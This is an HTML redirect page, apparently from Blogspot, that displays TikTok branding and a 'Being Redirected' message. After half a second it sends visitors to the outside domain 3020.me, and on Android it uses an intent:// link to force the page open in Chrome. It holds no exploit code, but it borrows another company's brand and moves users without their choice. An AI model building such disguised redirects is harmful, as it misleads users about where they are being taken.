<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <link rel="icon" href="https://sf-tb-sg.ibytedtos.com/obj/eden-sg/uhtyvueh7nulogpoguhm/tiktok-icon2.png" type="image/x-icon">
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
        }

        #tiktok-logo {
            width: 250px;
            margin-bottom: 20px;
        }

        #redirect-text {
            font-size: 30px;
            color: #333;
            opacity: 0;
            animation: fadeIn 2s ease-in-out forwards, scaleUp 2s ease-in-out infinite alternate;
        }

        @keyframes fadeIn {
            0% {
                opacity: 0;
            }

            100% {
                opacity: 1;
            }
        }

        @keyframes scaleUp {
            0% {
                transform: scale(1);
            }

            100% {
                transform: scale(1.2);
            }
        }

        #openLink {
            margin: 50px;
            text-align: center;
        }
    </style>
<link rel="me" href="https://www.blogger.com/profile/15640536915796453344" />
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>
</head>

<body>
    <img id="tiktok-logo" src="https://www9.0zz0.com/2024/04/06/13/548511907.gif" alt="TikTok Logo">
    <p id="redirect-text">Being Redirected ...</p>
    <a href="#" id="openLink">    </a>

    <script>
        function openLinkBasedOnDevice(url) {
            var userAgent = navigator.userAgent;

            if (/(android)/i.test(userAgent)) {
                // If the device is Android, open the link in Chrome
                window.location.href = 'intent://' + url.substring(url.indexOf("://") + 3) + '#Intent;scheme=http;package=com.android.chrome;end;';
            } else if (/(iphone|ipad|ipod)/i.test(userAgent)) {
                // If the device is iOS, open the link in Safari
                window.location.href = url;
            } else {
                // For other devices, open the link in the default browser
                window.location.href = url;
            }
        }

        // Automatically execute the function after a 5-second delay
        setTimeout(function () {
            var url = 'https://3020.me';
            openLinkBasedOnDevice(url);
        }, 500); // 500 milliseconds = 5 seconds
    </script>
</body>

</html>
